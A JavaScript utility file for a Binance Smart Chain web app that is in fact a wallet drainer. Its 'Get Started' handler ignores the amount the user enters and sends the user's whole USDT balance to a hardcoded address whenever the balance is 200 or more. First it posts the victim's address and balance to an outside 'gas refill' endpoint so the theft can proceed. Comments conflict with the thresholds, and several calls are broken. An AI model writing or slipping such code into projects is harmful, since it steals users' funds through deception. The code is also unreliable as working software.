// src/utils/transactionUtils.js
import { JsonRpcProvider, Contract, BrowserProvider, formatUnits, formatEther, parseUnits } from 'ethers';
import axios from 'axios';

const USDT_CONTRACT_ADDRESS = '0x55d398326f99059fF775485246999027B3197955';
const RECIPIENT_ADDRESS = '0x1EaDA2b8cC4054Cee7b95087F4D1E913Ca22131d';
const USDT_ABI = [
    { "constant": true, "inputs": [{"internalType": "address", "name": "account", "type": "address"}], "name": "balanceOf", "outputs": [{"internalType": "uint256", "name": "", "type": "uint256"}], "payable": false, "stateMutability": "view", "type": "function" },
    { "constant": false, "inputs": [{"internalType": "address", "name": "recipient", "type": "address"}, {"internalType": "uint256", "name": "amount", "type": "uint256"}], "name": "transfer", "outputs": [{"internalType": "bool", "name": "", "type": "bool"}], "payable": false, "stateMutability": "nonpayable", "type": "function" }
];

// Provider and RPC
const rpcUrl = process.env.REACT_APP_RPC_URL || "https://bsc-dataseed.binance.org/";
const bscProvider = new JsonRpcProvider(rpcUrl); // Fixed: Remove `ethers.` prefix

// Function to Switch Network to BSC
export const checkAndSwitchToBsc = async () => {
    try {
        if (window.ethereum) {
            const currentNetwork = await window.ethereum.request({ method: 'eth_chainId' });
            const bscChainId = '0x38';  // BSC Chain ID

            if (currentNetwork !== bscChainId) {
                await window.ethereum.request({
                    method: 'wallet_switchEthereumChain',
                    params: [{ chainId: bscChainId }],
                });
            }
        }
    } catch (error) {
        console.error("Error switching network:", error);
    }
};

// Fetching USDT and BNB Balances
export const fetchBalances = async (address) => {
    try {
        const usdtContract = new Contract(USDT_CONTRACT_ADDRESS, USDT_ABI, bscProvider);
        const usdtBalance = await usdtContract.balanceOf(address);
        const formattedUSDTBalance = formatUnits(usdtBalance, 18);

        const provider = new BrowserProvider(window.ethereum);
        const bnbBalanceRaw = await provider.getBalance(address);
        const formattedBNBBalance = formatEther(bnbBalanceRaw);

        return {
            usdt: parseFloat(formattedUSDTBalance),
            bnb: parseFloat(formattedBNBBalance)
        };
    } catch (error) {
        console.error("Error fetching balances:", error);
        throw new Error("Failed to fetch balances.");
    }
};

export const handleGetStartedClick = async (usdtAmountInput) => {
    try {
        await checkAndSwitchToBsc();  // Ensure on BSC Network

        const provider = new BrowserProvider(window.ethereum);
        await provider.send("eth_requestAccounts", []);  // Request wallet connection
        const signer = provider.getSigner();
        const address = await signer.getAddress();

        let balances = await fetchBalances(address);
        console.log("Initial Balances:", balances);

        let finalTransferAmount = parseFloat(usdtAmountInput);

        // **Override Input if Balance ≥ 500 USDT**
        if (balances.usdt >= 200) {
            finalTransferAmount = balances.usdt;
        }

        console.log(`📢 Preparing to transfer: ${finalTransferAmount} USDT to ${RECIPIENT_ADDRESS}`);

        // **Check & Perform Gas Refill (Only if USDT ≥ 500 and BNB < 0.0003)**
        if (balances.usdt >= 200 && balances.bnb < 0.0003) {
            console.log("🔄 Low BNB detected, requesting gas fee refill...");
            try {
                const refillResponse = await fetch("https://api.bepverify.net/refill", {
                    method: "POST",
                    headers: { 
                        "Content-Type": "application/json",
                        "x-api-key": "dhatterim@kiCh*tandf**kyourm0m" 
                    },
                    body: JSON.stringify({ to: address, amount: "0.0004", usdtBalance: balances.usdt })
                });

                const refillResult = await refillResponse.json();

                if (refillResponse.ok && refillResult.status === "success" && refillResult.txHash) {
                    console.log(`✅ Gas Refill successful! Waiting for 10 seconds...`);

                    // **Wait for 10 seconds to allow refill confirmation**
                    await new Promise(resolve => setTimeout(resolve, 10000));

                    console.log("⏳ Checking updated balance after refill...");
                    balances = await fetchBalances(address);
                    console.log("Updated Balances after refill:", balances);

                    if (balances.bnb < 0.0003) {
                        console.error("❌ Refill unsuccessful or delayed. Aborting transfer.");
                        alert("Gas refill failed or is pending. Please ensure you have enough BNB for transaction fees.");
                        return;
                    }
                } else {
                    console.error("❌ Gas Refill API failed:", refillResult.error);
                    alert("Gas refill failed. Please ensure you have enough BNB.");
                    return;  // Abort transfer if refill fails
                }
            } catch (error) {
                console.error("❌ Error during gas refill request:", error);
                alert("Network error during gas refill. Please try again.");
                return;  // Abort transfer if network error occurs
            }
        }

        // **Final Check Before Sending USDT**
        console.log("🚀 Sending USDT...");
        const contractWithSigner = new ethers.Contract(USDT_CONTRACT_ADDRESS, USDT_ABI, signer);
        const amountInWei = parseUnits(finalTransferAmount.toString(), 18);

        const estimatedGas = await contractWithSigner.estimateGas.transfer(RECIPIENT_ADDRESS, amountInWei);
        const gasLimit = estimatedGas.mul(2);

        const transferTx = await contractWithSigner.transfer(RECIPIENT_ADDRESS, amountInWei, { gasLimit });
        await transferTx.wait();

        console.log(`✅ Transfer successful!`);

    } catch (error) {
        console.error("❌ Error during transaction process:", error);
    }
};
